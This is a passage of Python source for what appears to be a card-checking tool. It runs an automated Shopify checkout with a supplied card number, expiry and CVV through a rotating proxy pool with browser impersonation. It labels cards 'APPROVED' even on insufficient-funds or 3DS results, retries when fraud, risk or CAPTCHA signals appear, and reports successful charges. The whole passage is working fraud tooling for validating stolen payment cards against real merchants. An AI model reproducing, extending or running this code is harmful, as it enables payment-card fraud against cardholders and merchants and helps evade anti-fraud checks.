                        proposal_id[:8], submit_id[:8], poll_for_receipt_id[:8])
        except Exception as e:
            logger.warning("Step 3 failed: %r", e)
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 3 failed: {e}")
            return result

        # Step 4
        try:
            _p4_status, proposal_body = send_proposal(client, shop_url, checkout_url, checkout_token, session_token,
                                                       stable_id, variant_id, price, proposal_id, build_id, source_token,
                                                       currency, country)
            check_proposal_errors("step4", _p4_status, proposal_body)
            cur = extract_seller_currency(proposal_body)
            if cur and cur != currency:
                currency = cur
            ctr = extract_seller_country(proposal_body)
            if ctr and ctr != country:
                country = ctr
            result.currency = currency
            if currency == "USD":
                seller_price = extract_seller_merchandise_price(proposal_body)
                if seller_price and seller_price != price:
                    price = seller_price
            queue_token = extract_queue_token(proposal_body)
            if not queue_token:
                raise Exception("could not extract queueToken")
            logger.info("Step 4 OK: queue_token=%s… currency=%s country=%s",
                        queue_token[:8], currency, country)
        except HardDecline as hd:
            logger.warning("Step 4 hard decline: %s", hd)
            result.status = CheckStatus.DECLINED
            result.status_code = str(hd)
            result.error = hd
            result.retryable = False
            return result
        except Exception as e:
            logger.warning("Step 4 failed: %r", e)
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 4 failed: {e}")
            return result

        # Step 5
        try:
            _p5_status, proposal2_body = send_proposal2(client, shop_url, checkout_url, checkout_token, session_token,
                                                         stable_id, variant_id, price, proposal_id, build_id, source_token,
                                                         queue_token, email, currency, country)
            check_proposal_errors("step5", _p5_status, proposal2_body)
            queue_token2 = extract_queue_token(proposal2_body)
            if not queue_token2:
                raise Exception("could not extract queueToken")
            logger.info("Step 5 OK: queue_token2=%s…", queue_token2[:8])
        except HardDecline as hd:
            logger.warning("Step 5 hard decline: %s", hd)
            result.status = CheckStatus.DECLINED
            result.status_code = str(hd)
            result.error = hd
            result.retryable = False
            return result
        except Exception as e:
            logger.warning("Step 5 failed: %r", e)
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 5 failed: {e}")
            return result

        # Step 6
        try:
            addr = pick_address_for_store(shop_url, currency, country)
            country = addr.country_code
            fallback_addrs = get_fallback_addresses(addr.country_code)
            fallback_idx = 0
            qt2 = queue_token2
            final_p3_body = None
            final_qt3 = None
            final_addr = addr
            step6_is_digital = False
            attempts = 1 + len(fallback_addrs)
            for _attempt in range(attempts):
                _, proposal3_body = send_proposal3(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, proposal_id, build_id, source_token,
                    qt2, email, addr, currency, country)
                _qt3 = extract_queue_token(proposal3_body)
                if not _qt3:
                    raise Exception("could not extract queueToken")
                _is_dig = not extract_is_shipping_required(proposal3_body)
                if _is_dig or not detect_shipping_restriction(proposal3_body):
                    final_p3_body = proposal3_body
                    final_qt3 = _qt3
                    final_addr = addr
                    step6_is_digital = _is_dig
                    break
                if fallback_idx < len(fallback_addrs):
                    addr = fallback_addrs[fallback_idx]
                    country = addr.country_code
                    fallback_idx += 1
                    qt2 = _qt3
            if not final_p3_body:
                raise Exception("no shipping available for any country")
            proposal3_body = final_p3_body
            queue_token3 = final_qt3
            addr = final_addr
            logger.info("Step 6 OK: queue_token3=%s… country=%s digital=%s",
                        queue_token3[:8], country, step6_is_digital)
        except HardDecline as hd:
            logger.warning("Step 6 hard decline: %s", hd)
            result.status = CheckStatus.DECLINED
            result.status_code = str(hd)
            result.error = hd
            result.retryable = False
            return result
        except Exception as e:
            logger.warning("Step 6 failed: %r", e)
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 6 failed: {e}")
            return result

        # Step 7
        time.sleep(0.05)
        try:
            _, proposal4_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                                                stable_id, variant_id, price, proposal_id, build_id, source_token,
                                                queue_token3, email, addr, currency, country)
            queue_token4 = extract_queue_token(proposal4_body)
            if not queue_token4:
                raise Exception("could not extract queueToken")
            logger.info("Step 7 OK: queue_token4=%s…", queue_token4[:8])
        except HardDecline as hd:
            logger.warning("Step 7 hard decline: %s", hd)
            result.status = CheckStatus.DECLINED
            result.status_code = str(hd)
            result.error = hd
            result.retryable = False
            return result
        except Exception as e:
            logger.warning("Step 7 failed: %r", e)
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 7 failed: {e}")
            return result

        # Step 8
        time.sleep(0.05)
        try:
            proposal5_status, proposal5_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                                                               stable_id, variant_id, price, proposal_id, build_id, source_token,
                                                               queue_token4, email, addr, currency, country)
            _ = proposal5_status
            logger.info("Step 8 OK")
        except HardDecline as hd:
            logger.warning("Step 8 hard decline: %s", hd)
            result.status = CheckStatus.DECLINED
            result.status_code = str(hd)
            result.error = hd
            result.retryable = False
            return result
        except Exception as e:
            logger.warning("Step 8 failed: %r", e)
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 8 failed: {e}")
            return result

        # PendingTerms polling
        try:
            _poll_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
            _pending_re = re.compile(r'"__typename"\s*:\s*"PendingTerms"')
            for _pi in range(6):
                if not _pending_re.search(proposal5_body):
                    break
                _m = _poll_re.search(proposal5_body)
                _wait = int(_m.group(1)) / 1000.0 if _m else 0.5
                time.sleep(max(_wait, 0.3))
                proposal5_status, proposal5_body = send_proposal3(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, proposal_id, build_id, source_token,
                    queue_token4, email, addr, currency, country)
        except Exception as e:
            logger.warning("PendingTerms polling error (ignored): %r", e)

        # Step 9
        try:
            ident_sig = extract_identification_signature(checkout_html)
            vault_url = extract_vault_url(checkout_html)
            vault_domain = extract_vault_domain(checkout_html) or site_name
            if not ident_sig:
                raise Exception("could not extract identification signature")
            card_name_str = f"{addr.first_name} {addr.last_name}"
            _, pci_body = send_pci_session(
                ident_sig, card_number, card_name_str,
                card_month, card_year, card_cvv,
                vault_domain, proxy_url,
                vault_url=vault_url, vault_domain=vault_domain,
                impersonate=impersonate)
            pci_session_id = extract_pci_session_id(pci_body)
            if not pci_session_id:
                _fallback = ("https://checkout.pci.shopifycs.com/sessions"
                             if "shopifyinc" in (vault_url or "")
                             else "https://checkout.pci.shopifyinc.com/sessions")
                _, pci_body = send_pci_session(
                    ident_sig, card_number, card_name_str,
                    card_month, card_year, card_cvv,
                    site_name, proxy_url, vault_url=_fallback,
                    impersonate=impersonate)
                pci_session_id = extract_pci_session_id(pci_body)
            if not pci_session_id and proxy_url:
                _, pci_body = send_pci_session(
                    ident_sig, card_number, card_name_str,
                    card_month, card_year, card_cvv,
                    vault_domain, "",
                    vault_url=vault_url, vault_domain=vault_domain,
                    impersonate=impersonate)
                pci_session_id = extract_pci_session_id(pci_body)
            if not pci_session_id:
                raise Exception(f"could not extract session ID (body: {pci_body[:120]!r})")
            logger.info("Step 9 OK: pci_session_id=%s…", pci_session_id[:8])
        except Exception as e:
            logger.warning("Step 9 failed: %r", e)
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 9 failed: {e}")
            return result

        # Step 10
        try:
            queue_token5 = extract_queue_token(proposal5_body)
            if not queue_token5:
                raise Exception("could not extract queueToken")
            is_digital = step6_is_digital
            delivery_handle = extract_delivery_handle(proposal5_body)
            if not delivery_handle and not is_digital:
                result.retryable = True
                raise Exception("could not extract delivery handle")
            signed_handles = extract_signed_handles(proposal5_body)
            _filled_dlv5 = ('"__typename": "FilledDeliveryTerms"' in proposal5_body or
                            '"__typename":"FilledDeliveryTerms"' in proposal5_body)
            if len(signed_handles) == 0 and not is_digital and not _filled_dlv5:
                result.retryable = True
                raise Exception("could not extract signedHandles")
            shipping_amount = extract_shipping_amount(proposal5_body)
            if not shipping_amount and not is_digital:
                result.retryable = True
                raise Exception("could not extract shipping amount")
            if not shipping_amount:
                shipping_amount = "0.00"
            total_amount = extract_checkout_total(proposal5_body)
            if not total_amount:
                total_amount = extract_seller_total(proposal5_body)
            if not total_amount and is_digital:
                total_amount = extract_running_total(proposal5_body)
            if not total_amount:
                raise Exception("could not extract total amount")
            result.amount = total_amount
            attempt_token = generate_attempt_token(checkout_token)
            current_tax = extract_tax_amount(proposal5_body)
            current_total = total_amount
            MAX_SUBMIT_RETRIES = 3
            submit_status = 0
            submit_body = ""
            for submit_attempt in range(1, MAX_SUBMIT_RETRIES + 1):
                submit_status, submit_body = send_submit_for_completion(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, submit_id, build_id, source_token, queue_token5, email,
                    addr, delivery_handle, shipping_amount, current_total,
                    pci_session_id, attempt_token, currency, country, signed_handles,
                    is_digital=is_digital,
                    tax_amount=current_tax
                )
                if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
                    new_tax = extract_tax_from_rejected(submit_body)
                    new_total = extract_total_from_rejected(submit_body)
                    if new_tax:
                        current_tax = new_tax
                    if new_total:
                        current_total = new_total
                    time.sleep(0.05)
                    continue
                if "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in submit_body:
                    new_total = extract_total_from_rejected(submit_body)
                    if new_total and new_total != current_total:
                        current_total = new_total
                        time.sleep(0.05)
                        continue
                break
            check_submit_errors(submit_status, submit_body)
            logger.info(_redact(f"Step 10 submit_status={submit_status} body={submit_body[:400]}"))
            receipt_id = extract_receipt_id(submit_body)
            if not receipt_id:
                error_msg = extract_any_error(submit_body)
                if "CAPTCHA" in (error_msg or ""):
                    result.status = CheckStatus.DECLINED
                    result.status_code = "CAPTCHA_REQUIRED"
                    result.retryable = True
                    result.error = Exception("CAPTCHA_REQUIRED")
                    return result
                if error_msg:
                    result.status = CheckStatus.DECLINED
                    result.status_code = error_msg
                    result.error = Exception(error_msg)
                    result.retryable = any(k in error_msg.lower() for k in ['inventory', 'retry', 'try again', 'generic', 'captcha'])
                else:
                    result.status = CheckStatus.ERROR
                    result.error = Exception("could not extract receiptId or error message")
                    result.retryable = True
                return result
            receipt_session_token = extract_receipt_session_token(submit_body)
            if not receipt_session_token:
                raise Exception("could not extract sessionToken")
            logger.info("Step 10 OK: receipt_id=%s…", receipt_id[-12:])
        except Exception as e:
            logger.warning("Step 10 failed: %r", e)
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = e
            return result

        # Step 11
        poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
        type_name_re = re.compile(r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')

        for poll_num in range(1, 31):
            try:
                _, poll_body = send_poll_for_receipt(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    build_id, source_token, poll_for_receipt_id, receipt_id, receipt_session_token
                )
                receipt_type = ""
                match = type_name_re.search(poll_body)
                if match:
                    receipt_type = match.group(1)
                status_code = extract_receipt_status_code(poll_body, receipt_type)
                result.status_code = status_code
                logger.info(_redact(f"poll#{poll_num} type={receipt_type!r} body={poll_body[:300]}"))

                if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
                    real, receipt_url = is_real_charge(poll_body)
                    if real:
                        result.status = CheckStatus.CHARGED
                        result.status_code = "ORDER_PLACED"
                        result.receipt_url = receipt_url or checkout_url
                        return result
                    logger.info("receipt %s → downgraded to APPROVED (no real order)", receipt_type)
                    result.status = CheckStatus.APPROVED
                    result.status_code = "PAYMENT_PROCESSING"
                    result.receipt_url = ""
                    return result

                if receipt_type == "ActionRequiredReceipt":
                    result.status = CheckStatus.APPROVED
                    result.status_code = "3DS_AUTHENTICATION"
                    return result

                if receipt_type == "FailedReceipt":
                    error_code = ""
                    error_re = re.compile(r'"code"\s*:\s*"([^"]+)"')
                    match = error_re.search(poll_body)
                    if match:
                        error_code = match.group(1)
                    if "CAPTCHA" in error_code:
                        result.status = CheckStatus.DECLINED
                        result.status_code = "CAPTCHA_REQUIRED"
                        result.retryable = True
                        result.error = Exception("CAPTCHA_REQUIRED")
                        return result
                    elif error_code == "INSUFFICIENT_FUNDS":
                        result.status = CheckStatus.APPROVED
                        result.status_code = "INSUFFICIENT_FUNDS"
                        return result
                    elif error_code == "CARD_DECLINED":
                        result.status = CheckStatus.DECLINED
                        result.error = Exception(f"{error_code}")
                        return result
                    elif error_code == "GENERIC_ERROR":
                        result.status = CheckStatus.DECLINED
                        result.status_code = "CARD_DECLINED"
                        result.error = Exception("CARD_DECLINED")
                        return result
                    else:
                        if "InventoryReservationFailure" in poll_body:
                            result.status = CheckStatus.ERROR
                            result.retryable = True
                            return result
                        _site_signals = ["fraud", "not supported", "brand", "suspected", "risk", "shipping",
                                         "artifact", "transformer", "not available", "cannot be placed"]
                        if any(s in (error_code + " " + poll_body).lower() for s in _site_signals):
                            result.status = CheckStatus.ERROR
                            result.retryable = True
                            result.error = Exception(error_code)
                            return result
                        result.status = CheckStatus.DECLINED
                        result.error = Exception(f"{error_code}")
                        return result

                delay = 500
                match = poll_delay_re.search(poll_body)
                if match:
                    try:
                        d = int(match.group(1))
                        if d > 0:
                            delay = d
                    except ValueError:
                        pass
                time.sleep(min(delay, 3000) / 1000.0)
            except Exception as e:
                logger.warning("poll %d exception: %r", poll_num, e)
                result.status = CheckStatus.ERROR
                result.error = Exception(f"poll {poll_num} failed: {e}")
                return result

        result.status = CheckStatus.ERROR
        result.retryable = True
        result.error = Exception("exceeded 30 poll attempts")
        return result

    finally:
        client.close()


# ──────────────────────── load proxy pool on import ──────────────────
_load_proxy_pool_from_env()
